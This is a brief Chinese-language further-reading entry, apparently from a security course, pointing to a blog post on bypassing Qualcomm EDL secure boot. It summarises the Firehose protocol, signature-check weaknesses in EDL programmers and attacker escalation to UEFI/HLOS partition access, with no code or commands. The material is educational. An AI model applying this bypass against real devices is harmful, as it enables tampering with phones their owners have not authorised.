   讀哪裡：binaryconflict.net 部落格，搜尋「Qualcomm EDL Secure Boot bypass」
   學什麼：Qualcomm EDL 的 Firehose protocol 詳解、如何在現代 Snapdragon 上找到 EDL programmer 的驗簽弱點、以及攻擊者如何從 EDL 進一步到完整 UEFI / HLOS 分區的讀寫
   關聯：本章 Qualcomm EDL 小節的深入，接 Ch 20（MTK/vendor SoC）的對照；展示「download mode 驗簽」不是通殺防禦，而是取決於實作品質

→ [下一章](./37-tpm2-architecture.md)
